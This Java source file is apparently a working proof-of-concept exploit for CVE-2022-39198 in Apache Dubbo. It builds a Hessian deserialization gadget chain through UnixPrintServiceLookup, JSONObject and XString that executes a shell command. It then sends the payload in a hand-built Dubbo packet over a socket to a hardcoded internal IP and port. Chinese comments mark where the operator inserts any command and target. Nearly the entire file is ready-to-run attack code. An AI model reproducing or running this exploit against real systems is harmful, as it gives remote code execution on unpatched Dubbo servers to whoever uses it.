package cve;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.com.caucho.hessian.io.HessianInput;
import com.alibaba.com.caucho.hessian.io.HessianOutput;
import com.alibaba.com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.json.JSONObject;
import sun.misc.Unsafe;
import sun.print.UnixPrintServiceLookup;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

public class CVE_2022_39198 {
    public static void setFieldValue(Object obj, String filedName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(filedName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }

    public static void setPayload(Hessian2Output hessian2Output,String cmd) throws InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, IOException {

        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);
        //绕过getDefaultPrinterNameBSD中的限制
        //设置属性
        setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
        setFieldValue(unixPrintServiceLookup, "osname", "xx");
        setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
        //封装一个JSONObject对象调用getter方法
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("xx", unixPrintServiceLookup);
        //使用XString类调用toString方法
        XString xString = new XString("xx");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",jsonObject);
        map1.put("zZ",xString);
        map2.put("yy",xString);
        map2.put("zZ",jsonObject);

        HashMap s = new HashMap();
        setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }

        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
        setFieldValue(s, "table", tbl);

        hessian2Output.writeObject(s);
    }
    public static void main(String[] args) {
        try {

            ByteArrayOutputStream dubbo_data = new ByteArrayOutputStream();
            // header.
            byte[] dubbo_header = new byte[16];
            // set magic number.
            Bytes.short2bytes((short) 0xdabb, dubbo_header);
            // set request and serialization flag.
            dubbo_header[2] = (byte) ((byte) 0x80 | 2);

            // set request id.
            Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);

            ByteArrayOutputStream dubbo_body = new ByteArrayOutputStream();
            Hessian2Output hessian2Output = new Hessian2Output(dubbo_body);
            hessian2Output.setSerializerFactory(new SerializerFactory());
            hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
            //todo 此处填写需要在Linux主机上执行的命令
            setPayload(hessian2Output,"touch /tmp/success");
            hessian2Output.flushBuffer();

            Bytes.int2bytes(dubbo_body.size(), dubbo_header, 12);
            dubbo_data.write(dubbo_header);
            dubbo_data.write(dubbo_body.toByteArray());

            byte[] bytes = dubbo_data.toByteArray();
            //todo 此处填写Dubbo服务地址及端口
            Socket socket = new Socket("192.168.26.164", 20880);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();

        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}